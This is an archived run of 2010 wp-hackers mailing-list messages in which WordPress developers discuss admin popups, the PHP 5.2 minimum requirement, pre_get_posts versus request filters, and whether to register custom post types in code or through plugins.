> On Fri, Jul 23, 2010 at 6:40 AM, Jared Williams <jaredwilli at gmail.com> wrote:
>> Sorry but this is irrelevant.
>> 
>> Is it possible to get this email list delivered as a once a day email, that
>> sends all of the emails of the day in one large message? I would like to be
>> subscribed to it but it blows up my inbox.
> 
> 
> You have a gmail account. Learn to use filters. They are your friends.
> 
> My filter is:
> 
> Has the words: listid:"wp-hackers.lists.automattic.com"
> Skip Inbox, Apply label "wp-hackers"
> 
> Thus, the messages from this list never show up in my Inbox, they show
> up as a label on the left side of the screen.

Also the digest option (which you appear to have chosen from the subject of the mail you replied to) should offer a daily digest I believe

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From paul at codehooligans.com  Fri Jul 23 16:52:44 2010
From: paul at codehooligans.com (Paul)
Date: Fri, 23 Jul 2010 12:52:44 -0400
Subject: [wp-hackers] Recommendations or Best Practice for admin-side popup
Message-ID: <2B3A5628-E43C-43A9-AB30-41EE579F7F03@codehooligans.com>

All,

I'm working on one of my plugins which will provide a popup launched from the wp-admin Media > Library page. For the popup I know I have multiple solutions at my disposal. I know I can use jQuery-UI which is included in WP core. But I also know this popup will not look like any other popup used in wp-admin. I've tried deconstructing the Media upload popup. But cannot find anything I can reuse. 

My question is. Is there some style recommendations of hooks in place that will be better than writing this and trying to match the style myself? I know I've seen past discussions on coming up with a style guide but cannot find anything that was produced. 

Any help will be appreciated. 

Thanks,

P-


From liste at srpski.biz  Fri Jul 23 17:21:53 2010
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Fri, 23 Jul 2010 19:21:53 +0200
Subject: [wp-hackers] Recommendations or Best Practice for admin-side
	popup
In-Reply-To: <2B3A5628-E43C-43A9-AB30-41EE579F7F03@codehooligans.com>
References: <2B3A5628-E43C-43A9-AB30-41EE579F7F03@codehooligans.com>
Message-ID: <AANLkTin=R77Ao_bzGhS9YbAO9bTVZo+b7xF9y-JnfaEB@mail.gmail.com>

Thickbox is used for popups in administration area.

2010/7/23 Paul <paul at codehooligans.com>

> All,
>
> I'm working on one of my plugins which will provide a popup launched from
> the wp-admin Media > Library page. For the popup I know I have multiple
> solutions at my disposal. I know I can use jQuery-UI which is included in WP
> core. But I also know this popup will not look like any other popup used in
> wp-admin. I've tried deconstructing the Media upload popup. But cannot find
> anything I can reuse.
>
> My question is. Is there some style recommendations of hooks in place that
> will be better than writing this and trying to match the style myself? I
> know I've seen past discussions on coming up with a style guide but cannot
> find anything that was produced.
>
> Any help will be appreciated.
>
> Thanks,
>
> P-
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From paul at codehooligans.com  Fri Jul 23 17:22:58 2010
From: paul at codehooligans.com (Paul)
Date: Fri, 23 Jul 2010 13:22:58 -0400
Subject: [wp-hackers] Recommendations or Best Practice for admin-side
	popup
In-Reply-To: <AANLkTin=R77Ao_bzGhS9YbAO9bTVZo+b7xF9y-JnfaEB@mail.gmail.com>
References: <2B3A5628-E43C-43A9-AB30-41EE579F7F03@codehooligans.com>
	<AANLkTin=R77Ao_bzGhS9YbAO9bTVZo+b7xF9y-JnfaEB@mail.gmail.com>
Message-ID: <E15734A5-405C-4DF9-85BB-251032D6F28F@codehooligans.com>

Thanks. You noticed that just after sending the email. 

P-

On Jul 23, 2010, at 1:21 PM, Milan Dini? wrote:

> Thickbox is used for popups in administration area.
> 
> 2010/7/23 Paul <paul at codehooligans.com>
> 
>> All,
>> 
>> I'm working on one of my plugins which will provide a popup launched from
>> the wp-admin Media > Library page. For the popup I know I have multiple
>> solutions at my disposal. I know I can use jQuery-UI which is included in WP
>> core. But I also know this popup will not look like any other popup used in
>> wp-admin. I've tried deconstructing the Media upload popup. But cannot find
>> anything I can reuse.
>> 
>> My question is. Is there some style recommendations of hooks in place that
>> will be better than writing this and trying to match the style myself? I
>> know I've seen past discussions on coming up with a style guide but cannot
>> find anything that was produced.
>> 
>> Any help will be appreciated.
>> 
>> Thanks,
>> 
>> P-
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From peaceable_whale at hotmail.com  Fri Jul 23 19:43:36 2010
From: peaceable_whale at hotmail.com (Franklin Tse)
Date: Sat, 24 Jul 2010 03:43:36 +0800
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
Message-ID: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>

Hello,

I have noticed that the PHP 4 and MySQL 4 End of Life Announcement has been posted to the WordPress News blog. However, the announcement does not specify the PHP 5.2 version requirement exactly. For example, Joomla! 1.6 requires PHP >=5.2.4 while Drupal 7 requires PHP >=5.2.0. Which PHP 5.2.x version do core developers want to support?

If there are sufficient statistics, a higher subversion number is preferred. Earlier PHP 5.2.x has bugs that may be difficult to workaround, like http://forum.joomla.org/viewtopic.php?f=391&t=248927.

Regards,
Franklin Tse 

From wp at andrewnacin.com  Fri Jul 23 20:09:44 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 23 Jul 2010 16:09:44 -0400
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>
Message-ID: <AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com>

On Fri, Jul 23, 2010 at 3:43 PM, Franklin Tse
<peaceable_whale at hotmail.com>wrote:

> I have noticed that the PHP 4 and MySQL 4 End of Life Announcement has been
> posted to the WordPress News blog. However, the announcement does not
> specify the PHP 5.2 version requirement exactly. For example, Joomla! 1.6
> requires PHP >=5.2.4 while Drupal 7 requires PHP >=5.2.0. Which PHP 5.2.x
> version do core developers want to support?
>
> If there are sufficient statistics, a higher subversion number is
> preferred. Earlier PHP 5.2.x has bugs that may be difficult to workaround,
> like http://forum.joomla.org/viewtopic.php?f=391&t=248927.
>

5.2.0.

Like Drupal, the Joomla project is moving to 5.2.0. You may be confusing it
with their MySQL requirement for 1.6, which is MySQL 5.0.4.

(Drupal 7's MySQL requirement is 5.0.15, and we are matching that. 5.0.15 is
the first production version of the 5.0.x branch.)

From angelia at 10sexyapples.com  Fri Jul 23 23:28:30 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Fri, 23 Jul 2010 16:28:30 -0700
Subject: [wp-hackers] pre_get_posts problem
Message-ID: <AANLkTi=9_1hKBgHxDpMn4NTnLMos41OiFFFXZWpy7q=f@mail.gmail.com>

This is one of the dangers/pitfalls of using pre_get_posts. It seems to be
recommended often for some reason when dealing with custom post types, but
it is much better to modify the request itself, versus any old get_posts or
WP_Query call.

The correct filter here would be either 'request' (direct QV access) or
parse_request (whole WP object to play with).


I've been keeping up to date with all things custom post since it's
development began in WP 3.0, and I can confirm that every post
explaining how to use custom post types has given the pre_get_posts
example.

Please excuse my ignorance at not completely understanding the advice
given above, but, could I ask if you would mind giving a clear code
example in this instance of how and where to implement this particular
request?

Is there a way to implement it from the functions file, or should it
be implemented in the author.php template itself, and what is the
correct way to have the author.php file display the regular post type,
select custom post types, and exclude pages?

I have also seen the advice given to use pre_get_posts, but, to make
sure to use (!is_admin) along with it, which according to further
posts in this thread is also inaccurate use of (!is_admin) right?

It would be great to get a simple layman example of how to achieve this~

From angelia at 10sexyapples.com  Sat Jul 24 02:13:54 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Fri, 23 Jul 2010 19:13:54 -0700
Subject: [wp-hackers] Is there any compelling reason to use a custom post
	type plugin?
Message-ID: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>

I've been following along with the development of custom post types as
the code was being written in WP 3.0, and because use of the new post
type features were crucial for the functionality of a site that I was
building for a non-profit group that helps get art into the schools,
went ahead and built the site alongside the development of 3.0 over
the last six months.

Initially I was hand coding everything myself in my functions file in
regards to my custom post types, and taxonomies. Then there was an
issue with permalinks and whether it would be done in core or not,
yadda yadda, and I saw some good development happening in the way of
plugins for managing the custom post types. I was extremely nervous at
first to relinquish control, but, after many days of research and
looking at all of the code to be sure that I understood exactly what
was happening in it and could make my own adjustments if need be, I
decided to go with a plugin. Once this was firmly decided and I
installed the plugin and updated the supports array and other code to
be in line with the development. I then had my client go ahead and
enter terms ( not hundreds, but, thousands of hierarchical ones ) to
begin testing the filtering and relations functions.

Fast forward through months of building the site and entering content,
and we have found that we also need to register our taxonomies to the
default "link" object type. This shouldn't be a problem, as I can just
add register_taxonomy_for_object_type('art', 'link'); and I'm good to
go. But, as it turns out, this isn't the case. The code in the
management plugin is using a foreach loop through (get_post_types) to
create the checkboxes in the plugins interface for registering a
taxonomy to an object type. Of course, get_post_types does not
encompass the link object type.

At this point, I figured I was still okay, I had options:

Here are those options and the results of them over the past desperate week.

Option 1 - Put in a support request to the plugin developer to make
this inclusion so that everything stays clean in the backend.
Response - one quick "I'm not sure what you're getting at" and then
silence for the last week, despite my immediate and very clear
explanation.

Option 2 - hack the plugin again, and write it in myself.
Response - despite endless hours of effort, and inquiries here, I have
not been able to figure out a way to rewrite this foreach loop to
include the link object type.

Option 3 - Append a checkbox to the end of the foreach for the
post_types and have it register that way.
Response - Same as above. I haven't been able to figure out how to
create this checkbox properly, and I haven't received any response to
my requests for help.

Option 4 - Forget about the code being clean and just add the
register_taxonomy_for_object_type('art', 'link'); in my functions
file.
Response - The plugin is coded with some complex class specific
functions now that I don't entirely understand, but, I believe that
the code is saying, "if it isn't registered within this class ...
ignore it."

Option 5 - Beg, plead and publicly humiliate myself for any help whatsoever.
Response - none. ;-) I don't think I would respond to me either.

Option 6 - Push the deadline forward again, completely remove the
plugin, which will also remove or orphan all of my terms and the other
code in the site that is tied in with some of the functions within the
plugin, rewrite all of the registration functions for the post types
and taxonomies again, and have my client re-enter the thousands of
terms.
Response - Gigantic pain the #$@!, but, this will work and will avoid
this ever happening again.

Through this experience, I have come to the conclusion that it is VERY
important that these folks who are writing these particular plugins
realize that this is a monumental breakthrough in WP, and that it
affects more than what most plugins have ever affected. These post
types are the very core of the sites that are utilizing them, they are
the new "post". People are relying on them to be coded thoroughly and
accurately. Yes, they are plugins, and they are free, and someone was
kind enough to code them for everyone else's use, and that is the
beautiful thing that draws so many to WP to begin with. Believe me,
I'm not trying to look a gift horse in the mouth. I'm not that person.

I just feel that as a community we need to speak about these things,
and that in regards to this specific area, plugin developers need to
be acutely aware of the big mess a poorly coded or supported post
management plugin can cause. I believe this custom post type
advancement has created a lot of interest in WP, and I hate to think
of someone deciding to make the switch to WP, perhaps because of the
custom post type advancements, only to have what I've just gone
through happen to them. Can you imagine telling a client that they
need to reenter 3 years worth of terms or content or worse?

Having said that, I'll get to my point.

I feel that if the above plugin developers are going to put code out
there that they know is incomplete or that they have no intention of
maintaining or supporting, that they at least need to code it with two
very important things in mind:

#1 - Allow the plugin to be disabled without losing the terms
associated with the taxonomies. This should be an option. Should the
plugin not stay up to date or just not be supported any more, the site
administrator should be able to disable it, and enable another. In
that new plugin ( or in their functions file ), they should be able to
register their post types and taxonomies again, or perhaps even have a
way to de-register without erasing, and re-register a post type, and
taxonomies, so that when they are re-registerd all of the terms and
relations are in tact. I know that I had a problem with this when I
was first testing the plugin I went with, where a revision existed in
the database with a custom post type attached from my hand coded
version, and therefore I could not register the post type with the
plugin.

#2 - Do not wrap the registration functions in classes in such a way
that the site administrator cannot interact with their custom post
types and taxonomies via core code hooks and filters, outside of your
plugin ... i.e. if your plugin code is registering my custom
taxonomies, and I need to add in
register_taxonomy_for_object_type('art', 'link'); because it is not in
your code, don't make that an impossibility for me. Otherwise, an
awful lot of people are going to be hitting dead ends in the future,
as this great new functionality evolves, and they are locked into code
like this that controls such an important aspect of their site.

If you've gotten this far in reading this novel, then I will continue
on with what is an actual request for advice:

So many of you out there are so much more advanced than myself in
understanding all of this, and I respect your knowledge and
experience. Having read the above, and knowing that my only option at
this point is to go back to hand coding everything with no GUI, do you
feel that there are any crucially important aspects of custom post
types that are being handled by a plugin, that aren't being handled in
core?
I don't see any, but, this time I'm asking questions. I don't want to
just go on my own theories and possibly make the same mistake again.

Labels are handled
Capabilities are handled
Permalinks are handled
Supports array is thorough

Does anyone have any compelling argument for why it would be better to
use a plugin for managing post types and taxonomies, if you are
capable of doing all of the registrations yourself in your functions
file?

Feedback encouraged ...

From peaceable_whale at hotmail.com  Sat Jul 24 03:28:08 2010
From: peaceable_whale at hotmail.com (Franklin Tse)
Date: Sat, 24 Jul 2010 11:28:08 +0800
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com>
Message-ID: <COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>

The minimum PHP requirement of Joomla! 1.6 is 5.2.4, not 5.2.0:

http://joomlacode.org/gf/project/joomla/tracker/?action=TrackerItemEdit&tracker_item_id=20913
http://docs.joomla.org/What's_new_in_Joomla_1.6

Not very sure why Joomla! requires .4 though.

Regards,
Franklin

--------------------------------------------------
From: "Andrew Nacin" <wp at andrewnacin.com>
Date: Saturday, 24 July, 2010 04:09
To: <wp-hackers at lists.automattic.com>
Subject: Re: [wp-hackers] PHP 5.2 that WordPress 3.2 requires

> On Fri, Jul 23, 2010 at 3:43 PM, Franklin Tse
> <peaceable_whale at hotmail.com>wrote:
> 
>> I have noticed that the PHP 4 and MySQL 4 End of Life Announcement has been
>> posted to the WordPress News blog. However, the announcement does not
>> specify the PHP 5.2 version requirement exactly. For example, Joomla! 1.6
>> requires PHP >=5.2.4 while Drupal 7 requires PHP >=5.2.0. Which PHP 5.2.x
>> version do core developers want to support?
>>
>> If there are sufficient statistics, a higher subversion number is
>> preferred. Earlier PHP 5.2.x has bugs that may be difficult to workaround,
>> like http://forum.joomla.org/viewtopic.php?f=391&t=248927.
>>
> 
> 5.2.0.
> 
> Like Drupal, the Joomla project is moving to 5.2.0. You may be confusing it
> with their MySQL requirement for 1.6, which is MySQL 5.0.4.
> 
> (Drupal 7's MySQL requirement is 5.0.15, and we are matching that. 5.0.15 is
> the first production version of the 5.0.x branch.)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From wp at andrewnacin.com  Sat Jul 24 03:34:40 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 23 Jul 2010 23:34:40 -0400
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl> 
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com> 
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
Message-ID: <AANLkTikKdMecqovkagucodoDPkOtaCeDXztwt+Sy1mDt@mail.gmail.com>

On Fri, Jul 23, 2010 at 11:28 PM, Franklin Tse
<peaceable_whale at hotmail.com>wrote:

> The minimum PHP requirement of Joomla! 1.6 is 5.2.4, not 5.2.0:
>
>
> http://joomlacode.org/gf/project/joomla/tracker/?action=TrackerItemEdit&tracker_item_id=20913
> http://docs.joomla.org/What's_new_in_Joomla_1.6
>
> Not very sure why Joomla! requires .4 though.


Fair enough. Their official page for technical requirements only lists 5.2.
http://www.joomla.org/technical-requirements.html

We're going to 5.2.0.

From wordpress at dd32.id.au  Sat Jul 24 03:47:13 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sat, 24 Jul 2010 13:47:13 +1000
Subject: [wp-hackers] Is there any compelling reason to use a custom
 post type plugin?
In-Reply-To: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
References: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
Message-ID: <op.vgbwszxmspxmuu@ho.st>

On Sat, 24 Jul 2010 12:13:54 +1000, Angelia Baladon  
<angelia at 10sexyapples.com> wrote:
> #1 - Allow the plugin to be disabled without losing the terms
> associated with the taxonomies. This should be an option. Should the
> plugin not stay up to date or just not be supported any more, the site
> administrator should be able to disable it, and enable another. In
> that new plugin ( or in their functions file ), they should be able to
> register their post types and taxonomies again, or perhaps even have a
> way to de-register without erasing, and re-register a post type, and
> taxonomies, so that when they are re-registerd all of the terms and
> relations are in tact. I know that I had a problem with this when I
> was first testing the plugin I went with, where a revision existed in
> the database with a custom post type attached from my hand coded
> version, and therefore I could not register the post type with the
> plugin.

Just like to mention here, If a plugin is deleting custom post_type DATA  
or taxonomy TERMS upon deactivation thats a bad thing.
However, Once the plugin is deactivated, the registration calls are  
terminated, As a result, WordPress no longer knows about the posts in the  
table, or the terms.

If you simply register a new post_type of the same name in code, and the  
taxonomies, WordPress should "link" everything together again (Or rather,  
just enable the admin UI/front end UI for them, since the data was never  
"lost")

> #2 - Do not wrap the registration functions in classes in such a way
> that the site administrator cannot interact with their custom post
> types and taxonomies via core code hooks and filters, outside of your
> plugin ... i.e. if your plugin code is registering my custom
> taxonomies, and I need to add in
> register_taxonomy_for_object_type('art', 'link'); because it is not in
> your code, don't make that an impossibility for me. Otherwise, an
> awful lot of people are going to be hitting dead ends in the future,
> as this great new functionality evolves, and they are locked into code
> like this that controls such an important aspect of their site.

This is a great reason why "developer" plugins SHOULD include plenty of  
do_action('myplugin_after_initposttypes'); sort of calls, to allow other  
developers to take advantage of such functionality.


One of the things i'd like to mention here however, Is that plugins are  
often written to fufil a simple task, in this case, the plugin is designed  
to simply register the post type, and taxonomy, Its not designed to be  
highly customisable and be able to be morphed into every possible  
use-case, Its probably designed for power users who want to add a post  
type, but -cant- write the code to achieve it.



Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  msn: msn at d32.id.au
  skype: theonly_dd32
  Web: http://dd32.id.au/

From wp at andrewnacin.com  Sat Jul 24 03:51:42 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 23 Jul 2010 23:51:42 -0400
Subject: [wp-hackers] Is there any compelling reason to use a custom
	post type plugin?
In-Reply-To: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
References: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
Message-ID: <AANLkTinxWR-ah6H9cLDsO2SGiEmE389HmGkD7B16baXC@mail.gmail.com>

>
> Does anyone have any compelling argument for why it would be better to

use a plugin for managing post types and taxonomies, if you are

capable of doing all of the registrations yourself in your functions

file?


Not one bit. If you know what you're doing, do it yourself. Don't waste your
time using a plugin to manage post type and taxonomy registrations.

Post types are not "plug-n-play." They are but a tool. In many cases,
there's a lot you need to do beyond registration to actually leverage your
post type or taxonomy according to your own use case, and no plugin can
possibly account for those things.

I think such management plugins are fine if you simply want another post
type -- literally of the sort, you have posts and pages, and you also want,
say, an articles type. But once you start getting into anything advanced or
specialized, I would absolutely roll your own. Especially since you clearly
have a grip on how they work.

My take.

From mikeschinkel at newclarity.net  Sat Jul 24 04:30:15 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 24 Jul 2010 00:30:15 -0400
Subject: [wp-hackers] Is there any compelling reason to use a custom
	post type plugin?
In-Reply-To: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
References: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
Message-ID: <DE6D0164-BB99-4158-8884-EBF15B67548A@newclarity.net>

On Jul 23, 2010, at 10:13 PM, Angelia Baladon wrote:
> Does anyone have any compelling argument for why it would be better to
> use a plugin for managing post types and taxonomies, if you are
> capable of doing all of the registrations yourself in your functions
> file?

I've evolved my thinking over the past few month after using custom post types heavily for several projects.  Here goes:

=========
Pros of Using Admin-console Plugins for Managing Custom Post Types
=========
-- Great for End Users who want to do some basic things and that will never be able to willing to write code.
-- Great for rapid prototyping, especially face-to-face with a client.
-- Great for themers and developers new to custom post types to get familiar with the options and what effect each option has.

=========
Pros of Registering Custom Post Types in Code
=========
-- Much easier to deploy .PHP files via FTP than to merge configuration stored in a MySQL database 
-- Much easier to apply the best practice of source code control with Subversion or Git
-- Easier for those who are more advanced (text copy/paste then editing is easier than editing in the admin or trying to export/import MySQL data.)
-- Possible to associate related functionality within a single deployable unit (i.e. plugin, or theme.)
-- Results in more robust applications (end user admins can't break your app by changing critical functionality.)
 
In summary, admins console plugins are for learning and prototyping and for advanced users whereas registering via code are for those who are building plugins, themes and robust web sites. IMO at least.

Hope this helps.

-Mike

From mikeschinkel at newclarity.net  Sat Jul 24 04:40:08 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 24 Jul 2010 00:40:08 -0400
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <op.vgaqg0esspxmuu@ho.st>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
	<op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>
	<op.vgaqg0esspxmuu@ho.st>
Message-ID: <DC6BDD70-DD8B-4474-8F2C-B0644ACBDF2E@newclarity.net>

On Jul 23, 2010, at 8:32 AM, Dion Hulse (dd32) wrote:
> For example, I've seen people suggesting using is_admin() inside certain filters to exclude the admin, where, in actual fact, they should be hooking somewhere completely different to prevent affecting other queries. Unless people highlight to others (and menu's have really helped do this) that doing things in certain ways will break code, people dont change, and new articles/blog posts dont get made explaining the "correct" new way of achieving it.

Over the past several years and especially the past several months I've done some pretty elaborate plugin development and to do so I've debugged through code and found how to make things work.  However, I have frequently felt like the methods I have discovered are difficult to make robust and have felt that there have got to be a better ways. Unfortunately I just haven't been able to find many (any?) authoritative source(s) to help me identify what those ways should be, with a few notable exceptions (Otto has some great blog posts on a few of these topics.)  For many of those things I've found that absolutely nothing (via Google searches) has been written on those specific topics.  While I don't have to details suggestions for how to resolve this I do agree that having a way to easily identify these best practices could be really important to the plugin developer community as well as WordPress at large.  JMTCW.

-Mike


From wordpress at dd32.id.au  Sat Jul 24 08:32:52 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sat, 24 Jul 2010 18:32:52 +1000
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <DC6BDD70-DD8B-4474-8F2C-B0644ACBDF2E@newclarity.net>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
	<op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>
	<op.vgaqg0esspxmuu@ho.st>
	<DC6BDD70-DD8B-4474-8F2C-B0644ACBDF2E@newclarity.net>
Message-ID: <op.vgb9021mspxmuu@ho.st>

On Sat, 24 Jul 2010 14:40:08 +1000, Mike Schinkel  
<mikeschinkel at newclarity.net> wrote:

> On Jul 23, 2010, at 8:32 AM, Dion Hulse (dd32) wrote:
>> For example, I've seen people suggesting using is_admin() inside  
>> certain filters to exclude the admin, where, in actual fact, they  
>> should be hooking somewhere completely different to prevent affecting  
>> other queries. Unless people highlight to others (and menu's have  
>> really helped do this) that doing things in certain ways will break  
>> code, people dont change, and new articles/blog posts dont get made  
>> explaining the "correct" new way of achieving it.
>
> Over the past several years and especially the past several months I've  
> done some pretty elaborate plugin development and to do so I've debugged  
> through code and found how to make things work.  However, I have  
> frequently felt like the methods I have discovered are difficult to make  
> robust and have felt that there have got to be a better ways.  
> Unfortunately I just haven't been able to find many (any?) authoritative  
> source(s) to help me identify what those ways should be, with a few  
> notable exceptions (Otto has some great blog posts on a few of these  
> topics.)  For many of those things I've found that absolutely nothing  
> (via Google searches) has been written on those specific topics.  While  
> I don't have to details suggestions for how to resolve this I do agree  
> that having a way to easily identify these best practices could be  
> really important to the plugin developer community as well as WordPress  
> at large.  JMTCW.

One of the problems I feel, is that those who understand some of these  
problems, are not the ones being asked to achieve the goal, And if they  
are, they don't realise that other people may need to do the same thing  
themselves.. At the same time, Comes times where you attempt something  
that no-one else has, and there simply isnt a filter for it.. Its going to  
happen sometimes

But with understanding comes blindness, I for example, would never even  
dream someone would use pre_get_posts to modify the front-end query, it  
screams of someone who doesnt have the foggiest of ideas on how the  
WordPress Query classes work; So its not something I would personally ever  
needed explaining, Unless it was asked of me, or i saw it being used  
incorrectly (And i often comment on a select few blogs I'm following for  
that reason, For example, This comment here:  
http://wpengineer.com/small-tips-using-wordpress-and-jquery/ - If anyone  
writes a blog with code excepts related to WordPress often, email me  
privately with the RSS feed and i'll post comments if I notice anything  
btw)

There is near nothing written on the Plugin/Theme upgraders for example,  
Ask me, and I can probably answer the query however; But I wouldn't know  
where to start writing for example, I wouldn't have a scenario which would  
require writing a howto on it.

Mark has recently put a form up for people to ask him questions, each week  
he's been giving a answer to a select few questions:  
http://markjaquith.wordpress.com/ask-wordpress/ &  
http://en.wordpress.com/tag/ask-wordpress/ for the previous answers. That  
sort of thing is a great start IMO, And I'll do the same one day when I  
have the time for it.

In the meantime, Developers shouldn't always trust code they find online,  
Sure, It says it achieves #1, but in actual fact, It does that whilst  
breaking #2, #3, and #4.. Always triple check what the codes hooking  
into....
I know i shouldn't have to say that, but there are far too many  
Copy-Pasters in the WordPress community as a whole, Many may be able to do  
it themselves, but trust that 3rd party code was tested correctly, News  
for you, Often it isnt, and is written by a developer with less knowledge  
than you!

Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From otto at ottodestruct.com  Sat Jul 24 08:50:52 2010
From: otto at ottodestruct.com (Otto)
Date: Sat, 24 Jul 2010 03:50:52 -0500
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl> 
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com> 
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
Message-ID: <AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com>

On Fri, Jul 23, 2010 at 10:28 PM, Franklin Tse
<peaceable_whale at hotmail.com> wrote:
> The minimum PHP requirement of Joomla! 1.6 is 5.2.4, not 5.2.0:
>
> http://joomlacode.org/gf/project/joomla/tracker/?action=TrackerItemEdit&tracker_item_id=20913
> http://docs.joomla.org/What's_new_in_Joomla_1.6
>
> Not very sure why Joomla! requires .4 though.

PHP versions 5.2.0-3 all had fairly critical bugs that would very
likely cause issues. 5.2.4 was the first version that worked well.

-Otto

From mda at blogwaffe.com  Sat Jul 24 09:22:41 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Sat, 24 Jul 2010 02:22:41 -0700
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com> 
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
Message-ID: <AANLkTimGGgDDV19buYxW9XdLyEAF-KiSb3__fX1MLu7n@mail.gmail.com>

On Tue, Jul 20, 2010 at 10:14 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
> On Wed, Jul 21, 2010 at 12:57 AM, Angelia Baladon
> <angelia at 10sexyapples.com>wrote:
>> I'm running a pre_get_posts filter on is_author() in order to include my
>> custom post types when author.php is called.
>>
>> If I don't include nav_menu_item in the query set, the primary menu (
>> basically the default twenty ten nav ) disappears. This makes sense.
>>
>> But, if I DO include nav_menu_item in the query set, I get nav_menu_item/s
>> listed in the loop.
>>
>> add_filter( 'pre_get_posts', 'custom_posts' );
>>
>> function custom_posts( $query ) {
>>
>> ? ?if ( is_author() )
>> ? ? ? ?$query->set( 'post_type', array( 'post', 'nav_menu_item', 'lesson',
>> 'howto', 'workshop', 'attachment' ) );
>>
>> ? ?return $query;
>> }
>
> This is one of the dangers/pitfalls of using pre_get_posts. It seems to be
> recommended often for some reason when dealing with custom post types, but
> it is much better to modify the request itself, versus any old get_posts or
> WP_Query call.
>
> The correct filter here would be either 'request' (direct QV access) or
> parse_request (whole WP object to play with).

That should work for this scenario, but the hooks in the WP class
(parse_request, request, etc.) only affect the main loop (mostly).  If
you want your plugin to be more invasive than that (widgets,
sub-loops, additional loops, etc.), pre_get_posts is the way to go.

If you want to use pre_get_posts in this case, you have to check two things:
1. is_author() -- are we on an author archive page?
2. $query->is_author -- is this query an author query, or some other
query on that page?

